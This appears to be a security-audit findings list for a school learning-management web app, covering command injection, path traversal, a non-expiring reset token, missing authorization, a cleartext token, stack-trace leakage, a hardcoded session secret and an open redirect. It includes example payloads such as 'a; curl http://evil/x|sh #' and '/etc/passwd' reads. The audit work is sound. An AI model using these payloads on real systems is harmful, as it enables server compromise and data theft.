extra.message: convertResourceFormat() builds a shell command by directly interpolating the caller-supplied sourcePath and format into a template string passed to execSync(), with no allowlist or shell-metacharacter escaping (unlike the sibling exportRubricDocument, which validates format against ALLOWED_RUBRIC_FORMATS and uses spawn with shell:false). It is called from POST /api/instructor/resources/convert (src/app/api/instructor/resources/convert/route.ts:18) with sourcePath and format taken verbatim from the authenticated request JSON body. An instructor or TA can submit sourcePath like "a; curl http://evil/x|sh #" or format containing backticks/$() to execute arbitrary OS commands on the server.

storeGeneralAttachment() takes the 'category' form field directly from the request with no validation/allowlist and uses it to build the destination path via join(process.cwd(), UPLOAD_DIR, `${category}/${filename}`). Any authenticated user (POST /api/upload) can set category to a value like '../../../../tmp' so mkdir(recursive:true) and writeFile() create directories and write the uploaded file's bytes outside the intended uploads directory, achieving an arbitrary file write on the server.

cwe: CWE-73: External Control of File Name or Path

extra.message: The [category] and [filename] dynamic route segments are joined directly into a filesystem path (join(process.cwd(), UPLOAD_DIR, params.category, params.filename)) with no basename()/normalization/allowlist check, unlike sibling helpers in this codebase (e.g. fetchRosterSnapshot in src/lib/report-archive.ts, which applies basename() and verifies the resolved path stays inside the target directory). Any authenticated user can supply segments such as category='..' and filename containing traversal sequences (including doubly-encoded '..%2f') to read files outside the uploads directory.

The GET handler reads the 'outputPath' query parameter and passes it directly to readFile() with no validation that it resolves inside any expected directory (e.g. the CACHE_DIR/rubrics folder). Any authenticated instructor/TA can request GET /api/instructor/resources/rubric-export?outputPath=/etc/passwd&document_title=x to read arbitrary files readable by the server process.

cwe: CWE-73: External Control of File Name or Path

extra.message: cacheResourceNote() builds a filesystem path from the caller-supplied 'category' and 'title' values with no sanitization (join(..., 'resource-notes', category, `${title}.txt`)). Both values come from the request body in createCourseResourceEntry() (src/lib/resource-cache.ts:76) with only an emptiness check, no character restrictions. An instructor/TA can set title to a value like '../../../../tmp/pwn' to write the note content to an arbitrary path outside the resource-notes directory; the corresponding GET handler in src/app/api/instructor/resources/route.ts:43 reads the file back the same unsanitized way, allowing arbitrary file read as well.

confirmPasswordReset() only checks `!record || record.usedAt` before honoring a password-reset token and never validates `record.expiresAt` against the current time, so a reset link never expires (tokens are created with a 1-hour expiresAt in requestPasswordReset but that field is never enforced here). This is inconsistent with the analogous redeemEnrollmentInviteLink() (same file, line ~124) which correctly checks `record.expiresAt.getTime() < Date.now()`. An attacker who obtains an old/leaked reset token (e.g. from logs, a shared email, or a previous session) can use it indefinitely to take over the account.

cwe: CWE-640: Weak Password Recovery Mechanism for Forgotten Password

extra.message: POST creates a discussion thread using `body.courseId` taken directly from the request with no check that the authenticated user can access that course. The GET handler in the same file (and a prior fix commit f980321) added a canAccessCourse() check, but the POST path that actually creates threads for a courseId was never updated. Any authenticated user (e.g. a student in Course A) can supply an arbitrary courseId for Course B and post a discussion thread into a course they are not enrolled in or do not teach.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: POST inserts a comment using `body.threadId` with no verification that the thread exists or that the user has access to its course (canAccessCourse/canTeachCourse is never called). Any authenticated user can post a comment onto any discussion thread ID, including threads belonging to courses they have no access to.

pushEnrollmentsToSis() sends the SIS integration token as a URL query parameter (`?token=${integrationToken}&cohortId=${cohortId}`) over SIS_BASE_URL, which defaults to a plaintext `http://` endpoint. This is inconsistent with pushCourseCatalogToSis() in the same file, which uses the `https://` SIS_SECURE_URL and sends the token via an Authorization header. Because this function is reached via GET /api/admin/enrollments/sync-status (src/app/api/admin/enrollments/sync-status/route.ts), the bearer token is exposed in cleartext on the wire and is also likely to be logged by intermediate proxies/servers since it is part of the URL.

cwe: CWE-319: Cleartext Transmission of Sensitive Information
CWE-598: Use of GET Request Method With Sensitive Query Strings

extra.message: buildExportErrorResponse() returns the raw exception message and stack trace in the JSON response whenever the caller-controlled `detailLevel` equals 'full'. This is reachable via GET /api/admin/export?detail=full (src/app/api/admin/export/route.ts:115), which passes the `detail` query parameter straight through. Any caller who can hit this endpoint can trigger error paths and read internal stack traces (file paths, library versions, internal logic) instead of a generic error message.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: The iron-session encryption password falls back to a hardcoded literal ('complex_password_at_least_32_characters_long_for_security') when SESSION_SECRET is not set in the environment. Since this value is committed in source, any deployment that omits SESSION_SECRET uses a publicly known key to encrypt/sign session cookies, letting an attacker forge arbitrary session cookies (including school_admin sessions).

resolveSubmissionReturnDestination() returns the caller-supplied `x-redirect-url` header value verbatim as the `returnTo` destination (src/app/api/student/submissions/route.ts:121), with no validation that it is a relative, in-app path. This is inconsistent with resolveCoursePreviewReturnDestination() in the same file, which restricts output to an explicit allowlist. If the client-side code redirects the browser to the returned `returnTo` value, an attacker who controls the `x-redirect-url` header (or a proxy embedding this LMS) can redirect a victim to an arbitrary external URL after submission.
